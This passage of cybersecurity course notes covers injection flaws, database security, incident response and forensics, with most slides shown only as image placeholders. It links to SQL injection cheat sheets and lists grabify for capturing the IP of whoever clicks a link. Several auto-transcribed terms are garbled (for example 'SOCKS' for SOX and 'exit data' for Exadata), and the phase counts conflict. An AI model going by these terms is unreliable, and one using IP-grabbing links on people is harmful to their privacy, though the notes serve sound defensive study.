detail here. Knowing what these processes are and how they work can be
very beneficial while troubleshooting and evaluating infrastructure
security. When you\'re ready, I\'ll catch you on the next video.

![Text Description automatically
generated](media/image796.png){width="6.5in" height="3.30625in"}

#### Database Security

##### Database and Injection attacks

###### Injection Flaws

![Graphical user interface Description automatically generated with low
confidence](media/image797.png){width="6.5in"
height="3.7736111111111112in"}

![Graphical user interface, text, application Description automatically
generated](media/image798.png){width="6.5in"
height="3.8368055555555554in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image799.png){width="6.5in"
height="3.7090277777777776in"}

![Graphical user interface, text, application Description automatically
generated](media/image800.png){width="6.5in" height="4.10625in"}

###### OS Command Injection

![A screenshot of a computer Description automatically generated with
medium confidence](media/image801.png){width="6.5in"
height="3.0840277777777776in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image802.png){width="6.5in"
height="4.102777777777778in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image803.png){width="6.5in"
height="3.9305555555555554in"}

![Graphical user interface, text, application Description automatically
generated](media/image804.png){width="6.5in"
height="3.720138888888889in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image805.png){width="6.5in"
height="2.534433508311461in"}

![Graphical user interface, text, email Description automatically
generated](media/image806.png){width="6.5in"
height="3.3481528871391077in"}

![Text, letter Description automatically
generated](media/image807.png){width="6.5in" height="3.6in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image808.png){width="6.5in"
height="2.9194444444444443in"}

![Text, application, letter Description automatically
generated](media/image809.png){width="6.5in"
height="3.3381944444444445in"}

![Table Description automatically
generated](media/image810.png){width="6.5in"
height="3.1354166666666665in"}

![Text, letter Description automatically
generated](media/image811.png){width="6.5in"
height="3.7993055555555557in"}

###### SQL Injection

![Graphical user interface, text, application, email Description
automatically generated](media/image812.png){width="6.5in"
height="3.770138888888889in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image813.png){width="6.5in"
height="2.588888888888889in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image814.png){width="6.5in"
height="3.265277777777778in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image815.png){width="6.5in"
height="4.127083333333333in"}

![Text Description automatically
generated](media/image816.png){width="6.5in"
height="1.8819444444444444in"}

![Text, application Description automatically
generated](media/image817.png){width="6.5in"
height="3.2041666666666666in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image818.png){width="6.5in"
height="1.7798611111111111in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image819.png){width="6.5in"
height="1.5173611111111112in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image820.png){width="6.5in"
height="3.047222222222222in"}

![Graphical user interface, text, application Description automatically
generated](media/image821.png){width="6.5in"
height="3.682638888888889in"}

###### SQL Injection in practice

![Diagram, text Description automatically
generated](media/image822.png){width="6.5in"
height="4.479166666666667in"}

###### Other types of injection

![Graphical user interface, text, application, email Description
automatically generated](media/image823.png){width="6.5in"
height="3.3652777777777776in"}

![Graphical user interface, text, application Description automatically
generated](media/image824.png){width="6.5in"
height="2.3986111111111112in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image825.png){width="6.5in"
height="2.7243055555555555in"}

![Graphical user interface, text, application Description automatically
generated](media/image826.png){width="6.5in"
height="1.7395833333333333in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image827.png){width="6.5in"
height="3.0854166666666667in"}

###### Additional Resources

**[OWASP Cheat Sheets]{.underline}**

Injection Flaws <https://owasp.org/www-community/Injection_Flaws>

OS Command Injection
<https://owasp.org/www-community/attacks/Command_Injection>

SQL Injection <https://owasp.org/www-community/attacks/SQL_Injection>

LDAP Injection
<https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html>

**[The Database Hacker\'s Handbook: Defending Database
Servers]{.underline}**

You can find it at different retailers such as Amazon.com.

**[pentestmonkey]{.underline}**

MSSQL injection cheat
sheet: <http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet>

Oracle injection cheat
sheet: <http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet>
 

DB2 injection cheat
sheet: <http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet>
 

Postgres injection cheat
sheet: [http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet
 ](http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)

MySQL injection cheat
sheet: <http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet>

###### Quiz Questions

![Text Description automatically generated with low
confidence](media/image828.png){width="6.5in"
height="7.656944444444444in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image829.png){width="6.5in"
height="7.914583333333334in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image830.png){width="6.5in"
height="6.991666666666666in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image831.png){width="6.5in"
height="2.5444444444444443in"}

##### Data sources

###### Types generally

Every organization whether it\'s a public or a private entity has many
different types of data sources, such as **distributed databases**[,
Microsoft SQL Server, Oracle, MySQL, SQL light]{.underline}, Postgres,
the list goes on and on and on. It\'s probably the most common database
type in the world.

Also **data warehouses** such as [Amazon\'s redshift or Hadoop\'s Hive
or TISA or exit data]{.underline}.

**Big Data NoSQL** We will cover those in a bit, but those you might be
familiar with such as [Google\'s BigTable or Hadoop and
MongoDB.]{.underline}

**File shares**. So file shares are everything from [Amazon S3, Google
Drive, Dropbox, Box.com]{.underline}, even your download folder on your
laptop. That would be a file share, that would be a directory, but
we\'ll cover those in a bit.

![Graphical user interface, text Description automatically
generated](media/image832.png){width="6.5in"
height="2.895138888888889in"}

So one thing every organization has in common is they\'re all using a
lot of data in a variety of combinations of these things. They might be
using all or only a couple of these. Also, organizations have many
different locations oftentimes regardless of it\'s a public or private
entity, it could be around the city, around the state, around the world.
That\'s true regardless if it\'s a retail store, bank, a hospital, even
a public building, even picking all the different locations, Amazon, and
IBM and Google have around the world. One thing in common with all of
these different entities, public and private, is they have a lot of
Infrastructure and the backend that help them do what they do day in and
day out, regardless if it\'s as simple as providing e-mail for the
organization, providing check clients for the organization, even simply
all the different projects going on in an organization, the project
holders, what they\'re working on, the way teams integrate together. All
the different backend systems being worked on our commonality in all
organizations that all of that background infrastructure is stored in
data centers. Now, it used to be in the early 2000\'s people still
thought mainly of security as a perimeter defense, and by perimeter
defense, I really mean firewalls and VPNs and stopping people from ever
getting into your organization. It\'s been proven time and time again
that that\'s just not adequate anymore if not in the current day and age
because regardless of people trying to come into your organization,
there\'s just so many different ways into an organization. You\'re not
just trying to come through your firewall, they\'re not just trying to
come through VPN. They\'re trying to come with your employees
credentials. They\'re trying to come through your business partners,
through other entities that you\'ve worked with that have access into
your data center. All of those different means of entering your data
center are all potential threat vectors or ways into your organization
that you have to think of and lock. Its essentially a safe with many,
many different windows and doors that each I will need some security
controls around. That\'s why so much focus has been given in the last 10
years to data security and all of the different bridges that you hear
again and again and again, where all somebody compromising an
organizations data security controls, or simply accessing it because of
lack of controls access to the data.

###### Data sources types in practice

![Graphical user interface, application Description automatically
generated](media/image833.png){width="6.5in"
height="3.4430555555555555in"}

In this video, you will learn to, identify the many data sources present
in a typical organization, identify the type of data commonly contained
in each data source.

Here\'s just an example of a couple of different things you would see in
typical organizations listers in no way shape or form exhaustive of the
different types of; Applications, Databases, Data Warehouses, Big Data
Environments, Files, Content Managers, Database Tools and Environments.
But this is an example of all the different things that have to do with
data in your organization. All the different avenues for people to
access the data. Typically, an organization, you won\'t just have
database. The DBAs connect to you. You\'ll really have applications that
connect to a back end database such as your HR system when people are on
board and off board. Say even as a key PeopleSoft shipping logistics for
your clients and make orders logistics of shipping it around the world
to your clients. Just need time for their deadlines etc. All of that
would be in Databases, Applications and you\'re really and your entire
workforce is logging into, do their job day in day out. Data Warehouses
are typically used for crunching numbers. They\'re oftentimes incredibly
vast amounts of data such as Hadoop Hive or Amazon redshift or even the
teaser and Exif Data purpose spill incredibly fast processors to do
nothing but crunch data incredibly efficiently and fast. So exif date is
really for crunching numbers if you want to think of it that way. Big
Data environments oftentimes you\'ll see an organization. It is a
massive amount of data. A lot of times people don\'t quite know what\'s
in the data or what they\'re going to do with it. So lot of times
you\'ll have legacy databases that events sunset and shut down. Somebody
archive the information and put it somewhere. They don\'t quite know
what to do with, so someone decides to throw it in Hadoop. Maybe, we\'ll
start gaining more information about our customers, our clients, our
products, how we do business, how we can do business better, how we can
interact with all of them better. So all that information just kinda
gets thrown into Big Data and the ideas oftentimes to simply start
gaining value out of it. Later as you start slice looking into it. Cloud
Environments simply different places to host your data versus on-prem
being data center that you have set up control and have complete
ownership of Database Tools simply for ways to interact with databases,
oftentimes used by DBAs but it can be a variety of different things used
for Content Manager, SharePoint, classical, and there\'s a lot of
different types though and that could really be just about anything. If
you\'re thinking of Enterprise Content Manager could be a project
management tool or something like that. Basically sending file\'s
certainly files you\'re probably more familiar with this than you might
think of or realize. So even your download folder would be File shares.
So Linux Unix Windows all the different files stored inside them would
be in all share unstructured data when you connect to HTTP sites all of
those would be unstructured data or it can be unstructured data. So Data
Source Types; Distribute Databases, Data Warehouses, Big Data, File
Shares. Distributed Database examples are; Oracle, DB2, Microsoft SQL
Server, MySQL, Postgres list goes on and on. Big Data examples; Hadoop,
MongoDB, BigTable. Data Warehouse examples; Netezza, Exadata, Amazon
Redshift, and Apache Hive. Fileshare examples; \"NAs\" (Network Attached
Storage), Network Fileshare such as; EMC or NetApp, and Cloud Shares
such as; Google drive, dropbox.com, box.com, and Amazon\'s S3 storage.
Thinking of the different database types, house look at distributed
databases and data warehouses. Both of those are often consider
structured data and we\'ll get into what that means in a minute. Big
Data database examples are oftentimes semi-structured data. Mostly
because oftentimes it\'s a lot of different structured data sources that
don\'t have means to look at all of the different types of data that was
thrown into it holistically, and I\'ll explain more about that in a
minute. Let me go over structured and semi-structured data, and posture
example simply unstructured data. So think of your download folder, you
had reason to download it but that\'s really it, it could depend on all
the different projects you\'re working on work, it could be your kids
Project,

Play video starting at :5:40 and follow transcript5:40

working for the first time or something like that. All the different
things you might download but no real structure to it whatsoever other
than that.

![Text Description automatically
generated](media/image834.png){width="6.5in"
height="3.2958333333333334in"}

##### Securing Databases

###### Securing the Crown Jewels

![Graphical user interface, website Description automatically
generated](media/image835.png){width="6.5in"
height="3.4763888888888888in"}

In this video, you will learn to: describe the data security journey in
terms of discover, harden, monitor and protect, and repeat. Identify
which activities are typically contained in each of these steps. This is
the data security journey that I\'ve been seeing our clients go through
again, around the world. Now, this is a process you see chevrons across
the top discover, harden, monitor checked, repeat. You could really
rewrite these to say, discover repeat, harden repeat, monitor repeat,
protect repeat. Because the reality in IT is, things never stay the
same. There\'s always a new version of a database, there\'s always a new
operating system with those come new vulnerabilities, there\'s always a
new database being set up, database being sunset and an entire
application being sunset in favor of something new that\'s replacing it,
there\'s just always change, there\'s always constant change. So even if
you completed one of the steps, you have to do it again and again to
have an understanding of where your organization was at that one point
in time, but as it\'s evolving over time. You need to have a clear
understanding of what\'s going on. I personally think of that three
different phases. I could call this identification to baseline, raising
the bar, as I like to call this phase and then this real-time monitor
protecting is really just applying security controls as appropriate for
the different data sources. So I\'ll walk you through them, getting
them.

1.  **So discovering classification**. It\'s one of the tenets of
    security that you cannot adequately secure something unless you know
    it exists, and understand clearly what it is. For example, if I
    somehow had a brick a gold, I would probably think of putting that
    in a safe like Fort Knox versus my house keys while certainly
    important, and I want to keep them safe, I might be okay with just
    putting them on my bedside stand. So very different controls for
    different items. Discovery processes is simply discovering all the
    different data sources in your environment, and the classification
    process is understanding not only where those different data sources
    are, but classifying the type of sensitive data in those data
    sources.

    a.  So ***discovery*** is discovering all of the different types of
        data sources in your environment, structured, semi-structured or
        unstructured, etc.

    b.  ***Classification*** is looking into those different data
        sources, and understanding not only where those different data
        sources are, but what types of sensitive data are each of those
        data sources. For example, SOCKS information, PCI information,
        PII information, PHI information, GPR information the list goes
        on and on, all the different types of data, and each of those
        different types of data have different types of controls that
        are used maybe because of different requirements constantly
        being and regulatory compliance needs, and rules and regulations
        that are really changing day to day, which requires specific
        controls for each of those different things like PCI
        requirements and encryption it can be up in hand.

2.  So **entitlement reporting** can be defined as a lot more than
    simply who has access to the data. Entitlement reporting can also go
    deeper, for example, not only who has access to different types of
    sensitive data; PII, PHI, PCI data, who has access to data source
    itself, and who has access to reconfigure the data source, a classic
    example there would be a DBA who does not have access to sensitive
    data on a system, because maybe that sensitive data is though, for
    example, it could be the rest of the DBAs who works with all of
    their salary information. Those are no reason for him to see that
    day to day basis, and a reason for it and have access to that. But
    perhaps he has the access to create a database user account with
    whatever roles and privileges and access levels that he wants to. So
    classic control to implement there would be whenever that DBA does
    onboard new person, you simply integrate it with your ticketing
    system. So now you can see the quest to onboard a new employee tied
    to the work that he\'s doing, and that would be a reasonable control
    to understand who\'s doing what, and letting them do the creation,
    certain windows, certain checks and balances in place.

3.  **Vulnerability assessment**. So vulnerability assessment is simply
    looking at industry benchmarks, and looking at the operating system
    and data sources inside your organization, and comparing them to
    best practices, and all the different benchmarks available.

4.  **Reconfigure, Mask and Encrypt**. Oftentimes, you\'ll see
    organizations go further than the basic benchmark, simply because
    they see that there are some, say intellectual property, or really
    important information we often refer to as crown jewels in an
    organization that they feel require more tests, and more stringent
    requirements for hardening the operating systems, and databases,
    then the basic benchmarks allow for or taken to a consideration. So
    raising the bar out to think of this as the moment where
    organizations will start looking at all the information they\'ve
    gathered through the identification and baseline phase, and they\'ll
    simply start implementing it., they\'ll start reconfiguring the data
    sources to harden them based on vulnerability assessment
    information, free operating systems and databases, they\'ll start
    implementing things such as masking, redaction, encryption on the
    data sources, and they could even be going further than that, and
    implementing safe monitoring, alerting, workflows to interact with
    the incident management teams, maybe through \[inaudible\] or
    something like that, like QRadar, and there\'s all other things they
    could do such as blocking business account, are there some
    suspicious activity like hey, you\'re supposed to be on vacation,
    and you just had a strange amount of activity going on usually only
    interact with one record at a time, \[inaudible\] 100 records. So
    it\'s not only block that before it ever happens, but it\'s also
    quarantine the account so we can look into this because that guy is
    supposed to be on vacation. It really doesn\'t make any sense right
    now, it\'s after-hours work. These are all red flags in that
    scenario.

5.  Of course, simply **activity monitoring**. So activity monitoring is
    as simple as capturing everything that\'s happening in these
    different data sources; structured, semi-structured, or
    unstructured, and giving you the ability to understand what happened
    at any point in time. So really giving you a system of record or a
    single source of truth. It\'s really a best practice to have that as
    itself a hardened, encrypted tamper-proof environment that you\'re
    going to be storing those in because obviously, it\'s sensitive data
    like very sensitive data because the only sensitive data is your
    security data.

![Diagram Description automatically
generated](media/image836.png){width="6.5in"
height="3.857638888888889in"}

So here are some industry best practices.

-   So **Center for Internet Security**, also notice the **CIS
    benchmarks**,

-   **CVE**, so **Common Vulnerabilities** and **Exposures**.

-   And then **STIGs**, which are released by the **Department of
    Defense**.

So all of those are different privileges, configuration settings,
security patches, password policies, OS-level file permission, so
password policy. An example there is not having a set number of failed
login attempts for someone. So I can just keep trying, and keep trying
until I finally guess the right password for a user account, obviously a
big no-no. So establish baselines for all the for organization
industries, applications, and it\'s just kind of on and on. Also, all
these different things are simply vulnerabilities for databases and
operating systems.

###### Securing Data Sources by Type

In this video, you will learn to describe how to decide what security
controls are needed to protect data against both outside actors, and
internal, and other trusted actors, describe how security considerations
change as you consider various hosting models such as; on-premise,
infrastructure as a service, platform as a service, and software as a
service. We talked a bit about perimeter defense. We talked about VPNs.
One of the big things to take into account though is, it\'s not simply
your users and your employees connecting to your data sources and your
data centers. It\'s also your business partners and other entities that
you do business with oftentimes have direct access into your data
centers and interior dip various data sources. So the controls that are
put in place and need to be put in place for each of these things really
needs to be thought of and taken into account based on how your
organization leverages those data sources to a new environment. Like my
example of the bar gold and car keys, different data requires different
levels of controls and different hardening of the operating system
databases that sits inside. But also you might think of not only
monitoring but also encrypting or tokenizing your data and encryption
rest, encryption motion is just the list goes on and on and on for
different ways that you could secure your data. Additionally, you\'re
talking about all these different data centers and different data types
and all these different applications that are running on those different
data types.

**[Were data is hosted]{.underline}**

The one thing we haven\'t talked about yet is where the data sources are
actually being hosted. So this one right here on premises is what most
people think of as their organizations data centers.

![Diagram Description automatically
generated](media/image837.png){width="6.5in"
height="3.8534722222222224in"}

So data center you operate and have full control over everything
happening inside. So in a data center, it doesn\'t matter if you\'re
thinking of the application, the data itself, runtime environment such
as the Java Runtime, middleware software is supporting all of that.
Above it, the operating system is sitting on. You have the ability to
touch and work with any of it. Even including the virtualization the
operating system maybe running inside, networking of that server,
storage of the server, and just the servers themselves. Like everything
top to bottom you have complete access to update, change, reconfigure,
however you see fit. Infrastructure as a Service and the rest of these
are known as cloud services defined in your cloud as infrastructure
service, platform as a service, software as a service. Oftentimes
you\'ll see these written as IaaS, PaaS, and SaaS or SaaS, PaaS and
infrastructure service. Infrastructure as a service, what organizations
will do is, they will have the servers likely owned and ran and updated
by other organizations such as a cloud provider like IBM, Google, Amazon
et cetera. They\'ll have one of us actually keep up the machine, make
sure it\'s running and simply make sure they have access to a certain
amount of servers, certain amount of processing, a certain amount of
disk space etc. So we worry about this everything here provider managed
and the only thing they think about is the operating system, updating
that, middleware, the runtime data, the application. So in this
scenario, infrastructure service they would have full access to the
operating system and be able to update it. But for all of this, they
would not have any access to it possibly even insight into it. Same goes
for platform as a service and software as a service. Platform as a
service, the only thing they would have access to modify would be
application or the data itself. They\'d be able to upload that and
change that. A lot of times this would be custom applications that
you\'re just putting on Cloud System to host it. Then software as a
service you\'re probably familiar with, even if you\'ll realize, it\'s
defined like that. Gmail would be software as a service because you
don\'t have any ability to reconfigure the database or the operating
system that Gmail is running on. Same thing would be Salesforce, same
thing would be Dropbox. All of those would be software and services
simply some sort of software that you interact with and that\'s it. You
have no access whatsoever to reconfigure the application, update the
application, update the operating system it\'s running on. You just have
to let the provider handle everything. With that comes a lot of
additional considerations for security and data security especially. For
example, in the on premise model, if I needed to install an agent on
server to monitor not only what an application is doing and everyone
that\'s logging in SAP is doing on a given day, to say Chris logged in,
versus Sam logged in, versus Sarah logged in and did X, Y, Z in the
course of the day, or I can simply go install that. Now on
infrastructure as a service, I can install that as well but depending on
how it\'s set up, I may not actually be able to see the underlying
virtualization and server that that virtualized system is running on. I
may not be able to see who\'s logging into that system and what they\'re
doing if I don\'t have access to install things if I need to on this
layer of infrastructure as a service. Same goes that way for platform as
a service and software as a service. I don\'t have the ability to even
install something on the operating system. So I need to come up with
other ways to secure the platform as a service and the data in that and
the software as a service and the data in that. An example would be
tokenization. I could implement tokenization and platform as a service.
In that tokenized data sitting on that server run by a provider, the
provider even if one of their employees did something nefarious and
copied the entire system, somewhere else the tokenized data is going to
stay tokenized regardless wherever it\'s copied to. Then all of a
sudden, they may have copied the system. But unless they have access to
my means of detokenizing or dencrypting that information, then they will
not be able to make any sense of that information. It\'ll simply be
gobbledygook for them or you may have format preserving tokenization. So
maybe instead of Chris Win it says John Smith. So you could still test
with it or whatever. But it\'s still not useful to someone that\'s
looking for the actual sensitive data. Software service, same thing. You
have to come up with different methods to work with software as a
service. Software service if it\'s connecting to your system through API
or something like that, then you can think of tokenization. There\'s
just different methods, different considerations, and place for each of
these things purely because of what they are and organizations not
having access to the underlying systems. Just because they\'re not
managing their enterprises and managing, users aren\'t managing the
different layers of the system or not all of them, such as the on-prem
model.

###### Anatomy of a Vulnerability Assessment Test Report

![Graphical user interface, text Description automatically
generated](media/image838.png){width="6.5in"
height="3.7631944444444443in"}

In this video, you will learn to describe what a vulnerability
assessment test report contains and how to read it. We talked a little
bit about vulnerability assessments. Here\'s an example vulnerability
assessment, from a recent assessment test that was done. So you\'ll see
this test passing 36 percent total, reflected here by this little dot.
This would be a chart over time. You run it again and again, and you\'d
rather want to see this with an upward trend. Now, it might be that you
have an operating system update, or a new version of a database and you
see a dip because some additional vulnerabilities have been released for
that new operating system version or database version. But on the whole,
everyone likes to see an upward trend here in this assessment result
history. Now, this is incredibly low, 36 percent. It\'s actually quite
normal to see that for some databases, if the only thing you\'ve done is
simply install the operating system, install the database software, and
then absolutely taken zero steps, no steps whatsoever, towards hardening
the operating system or the database itself. That\'s typically why you
would be in the 30s or 40s. You\'ll just see an example of different
results known as critical, categorized as critical major, minor,
cautionary, or just informational. Here you see the external references
with \[inaudible\] Department of Defense. You see test checks the value
of failed log in attempts, parameter for each. So for this one that
failed log in attempt value and it\'s never failed log in, allowed
before the account is locked. So simply how to define your threshold
value. I think this particular one suggests three or five, something
like that. I can\'t remember on top of my head. The recommendation fixes
simply the log in attempts is not set. High number of failed log in
attempts can indicate unauthorized users trying to gain unauthorized
access. While we\'ve all forgotten the password once or twice, the best
practice is to limit the amount of retries that anyone has when they do
forget their password. That way you\'re stopping someone from simply
standing there and trying again to access the system with your
credentials. It\'s just one of the many different mobility tests to
check.

###### Quiz: Data Sources, IBM Gaurdium, and Database Security

![Graphical user interface, text, application, email Description
automatically generated](media/image839.png){width="4.459722222222222in"
height="9.0in"}

## Incident Response

An *incident* usually refers to a data breach or cyber attack; however,
in some cases, it can be something less critical, such as a
misconfiguration, an intrusion attempt, or a policy violation. Examples
of a cyber attack include an attacker making our network or systems
inaccessible, defacing (changing) the public website, and data breach
(stealing company data). How would you *respond* to a cyber attack?
Incident response specifies the methodology that should be followed to
handle such a case. The aim is to reduce damage and recover in the
shortest time possible. Ideally, you would develop a plan ready for
incident response.

Previously, we discussed how SIEM tools are used to help protect an
organization\'s critical assets and data. In this video, we\'ll
introduce another important tool for maintaining an organization\'s
security, known as a playbook.

A playbook is a manual that provides details about any operational
action. Playbooks also clarify what tools should be used in response to
a security incident. In the security field, playbooks are essential.

Urgency, efficiency, and accuracy are necessary to quickly identify and
mitigate a security threat to reduce potential risk. Playbooks ensure
that people follow a consistent list of actions in a prescribed way,
regardless of who is working on the case. Different types of playbooks
are used. These include playbooks for incident response, security
alerts, teams-specific, and product-specific purposes. Here, we\'ll
focus on a playbook that\'s commonly used in cybersecurity, called an
incident response playbook. Incident response is an organization\'s
quick attempt to identify an attack, contain the damage, and correct the
effects of a security breach. An incident response playbook is a guide
with six phases used to help mitigate and manage security incidents from
beginning to end. Let\'s discuss each phase.

### Incident Response Playbook (5 phases)

1)  **Preparation**. Organizations must prepare to mitigate the
    likelihood, risk, and impact of a security incident by documenting
    procedures, establishing staffing plans, and educating users.
    Preparation sets the foundation for successful incident response.
    For example, organizations can create incident response plans and
    procedures that outline the roles and responsibilities of each
    security team member. This requires a team trained and ready to
    handle incidents. Ideally, various measures are put in place to
    prevent incidents from happening in the first place.

2)  **Detection and Analysis**. The objective of this phase is to detect
    and analyze events using defined processes and technology. Using
    appropriate tools and strategies during this phase helps security
    analysts determine whether a breach has occurred and analyze its
    possible magnitude. The team has the necessary resources to detect
    any incident; moreover, it is essential to further analyze any
    detected incident to learn about its severity.

3)  **Containment, Eradication, and Recovery**: Once an incident is
    detected, it is crucial to stop it from affecting other systems,
    eliminate it, and recover the affected systems. For instance, when
    we notice that a system is infected with a computer virus, we would
    like to stop (contain) the virus from spreading to other systems,
    clean (eradicate) the virus, and ensure proper system recovery.

    a.  **Containment.** The goal of containment is to prevent further
        damage and reduce the immediate impact of a security incident.
        During this phase, security professionals take actions to
        contain an incident and minimize damage. Containment is a high
        priority for organizations because it helps prevent ongoing
        risks to critical assets and data. A cybersecurity analyst must
        preserve evidence during the containment, eradication, and
        recovery phase. They must preserve forensic and incident
        information for future needs, to prevent future attacks, or to
        bring up an attacker on criminal charges. Restoration and
        recovery are often prioritized over analysis by business
        operations personnel, but taking time to create a forensic image
        is crucial to preserve the evidence for further analysis and
        investigation.When collecting evidence, you should always follow
        the order of volatility. This will allow you to collect the most
        volatile evidence (most likely to change) first, and the least
        volatile (least likely to change) last. You should always begin
        the collection with the CPU registers and cache memory
        (L1/L2/L3/GPU). The contents of system memory (RAM), including a
        routing table, ARP cache, process tables, kernel statistics, and
        temporary file systems/swap space/virtual memory. Next, you
        would move onto the collection of data storage devices like hard
        drives, SSDs, and flash memory devices.

    b.  **Eradication and Recovery**. This phase involves the complete
        removal of an incident\'s artifacts so that an organization can
        return to normal operations. During this phase, security
        professionals eliminate artifacts of the incident by removing
        malicious code and mitigating vulnerabilities.

    c.  **Recovery:** Once they\'ve exercised due diligence, they can
        begin to restore the affected environment to a secure state.
        This is also known as IT restoration. For instance, when we
        notice that a system is infected with a computer virus, we would
        like to stop (contain) the virus from spreading to other
        systems, clean (eradicate) the virus, and ensure proper system
        recovery.

4)  **Post-Incident Activity**. After successful recovery, a report is
    produced, and the learned lesson is shared to prevent similar future
    incidents. This phase includes documenting the incident, informing
    organizational leadership, and applying lessons learned to ensure
    that an organization is better prepared to handle future incidents.
    Depending on the severity of the incident, organizations can conduct
    a full-scale incident analysis to determine the root cause of the
    incident and implement various updates or improvements to enhance
    its overall security posture.

5)  **Coordination**. Coordination involves reporting incidents and
    sharing information, throughout the incident response process, based
    on the organization\'s established standards. Coordination is
    important for many reasons. It ensures that organizations meet
    compliance requirements and it allows for coordinated response and
    resolution.

There are many ways security professionals may be alerted to an
incident. You recently learned about SIEM tools and how they collect and
analyze data. They use this data to detect threats and generate alerts,
which can inform the security team of a potential incident. Then, when a
security analyst receives a SIEM alert, they can use the appropriate
playbook to guide the response process. SIEM tools and playbooks work
together to provide a structured and efficient way of responding to
potential security incidents.

### What is Digital Forensics?

Forensics is the application of science to investigate crimes and
establish facts. With the use and spread of digital systems, such as
computers and smartphones, a new branch of forensics was born to
investigate related crimes: computer forensics, which later evolved
into, *digital forensics*.

In defensive security, the focus of digital forensics shifts to
analyzing evidence of an attack and its perpetrators and other areas
such as intellectual property theft, cyber espionage, and possession of
unauthorized content. Consequently, digital forensics will focus on
different areas such as:

-   File System: Analyzing a digital forensics image (low-level copy) of
    a system's storage reveals much information, such as installed
    programs, created files, partially overwritten files, and deleted
    files.

-   System memory: If the attacker is running their malicious program in
    memory without saving it to the disk, taking a forensic image
    (low-level copy) of the system memory is the best way to analyze its
    contents and learn about the attack.

-   System logs: Each client and server computer maintains different log
    files about what is happening. Log files provide plenty of
    information about what happened on a system. Some traces will be
    left even if the attacker tries to clear their traces.

-   Network logs: Logs of the network packets that have traversed a
    network would help answer more questions about whether an attack is
    occurring and what it entails.

#### **Malware Analysis**

Malware stands for malicious software. *Software* refers to programs,
documents, and files that you can save on a disk or send over the
network. Malware includes many types, such as:

-   **Virus** is a piece of code (part of a program) that attaches
    itself to a program. It is designed to spread from one computer to
    another; moreover, it works by altering, overwriting, and deleting
    files once it infects a computer. The result ranges from the
    computer becoming slow to unusable.

-   **Trojan Horse** is a program that shows one desirable function but
    hides a malicious function underneath. For example, a victim might
    download a video player from a shady website that gives the attacker
    complete control over their system.

-   **Ransomware** is a malicious program that encrypts the user's
    files. Encryption makes the files unreadable without knowing the
    encryption password. The attacker offers the user the encryption
    password if the user is willing to pay a "ransom."

![A picture containing logo Description automatically
generated](media/image840.png){width="6.5in"
height="3.688888888888889in"}

Malware analysis aims to learn about such malicious programs using
various means:

1.  **Static analysis** works by inspecting the malicious program
    without running it. Usually, this requires solid knowledge of
    assembly language (processor's instruction set, i.e., computer's
    fundamental instructions).

2.  **Dynamic analysis** works by running the malware in a controlled
    environment and monitoring its activities. It lets you observe how
    the malware behaves when running.

### Forensic tools/resources

#### Email, exe, and url 

-   **Email Header analyzer**: MX Toolbox

    -   Analyze email headers

-   **Exe/Url Analysis**: Virus Total (Analyze a potentially malicious
    URL)

-   **Link Viewer**: Joe Sandbox

    -   Open links/attachments in a sandbox environment

-   **Link tracer**: grabify (get ip of user who clicked)

#### File metadata

##### Get Photo EXIF Data (exiftool)

**Usage**: exitftool \<image\>

EXIF stands for Exchangeable Image File Format; it is a standard for
saving metadata to image files. Whenever you take a photo with your
smartphone or with your digital camera, plenty of information gets
embedded in the image. The following are examples of metadata that can
be found in the original digital images:

-   Camera model / Smartphone model

-   Date and time of image capture

-   Photo settings such as focal length, aperture, shutter speed, and
    ISO settings

Because smartphones are equipped with a GPS sensor, finding GPS
coordinates embedded in the image is highly probable. The GPS
coordinates, i.e., latitude and longitude, would generally show the
place where the photo was taken.

There are many online and offline tools to read the EXIF data from
images. One command-line tool is exiftool. ExifTool is used to read and
write metadata in various file types, such as JPEG images. 

![Text Description automatically
generated](media/image841.png){width="6.5in"
height="2.0944444444444446in"}

![A picture containing text Description automatically
generated](media/image842.png){width="4.741345144356956in"
height="0.7831321084864392in"}

![Graphical user interface, text Description automatically
generated](media/image843.png){width="6.5in"
height="2.1590277777777778in"}

##### Get PDF metadata (pdfinfo)

![Text Description automatically generated with medium
confidence](media/image844.png){width="6.5in"
height="3.129861111111111in"}

# Purple team

![Graphical user interface, website Description automatically
generated](media/image845.png){width="6.5in"
height="3.5652777777777778in"}

# White Team

![A picture containing text, clothing, indoor, headdress Description
automatically generated](media/image846.png){width="6.5in"
height="3.3354166666666667in"}

# Review and quizzes

## Quiz (Attacks, Threats, and Vulnerabilities)

![Graphical user interface, text, application Description automatically
generated](media/image847.png){width="6.456944444444445in"
height="9.0in"}

![Graphical user interface, application Description automatically
generated](media/image848.png){width="6.248611111111111in"
height="9.0in"}

![Graphical user interface, text, application Description automatically
generated](media/image849.png){width="6.0256944444444445in"
height="9.0in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image850.png){width="6.304861111111111in"
height="9.0in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image851.png){width="6.5in"
height="4.016666666666667in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image852.png){width="6.5in"
height="4.165972222222222in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image853.png){width="6.5in"
height="3.6305555555555555in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image854.png){width="6.5in"
height="3.55625in"}
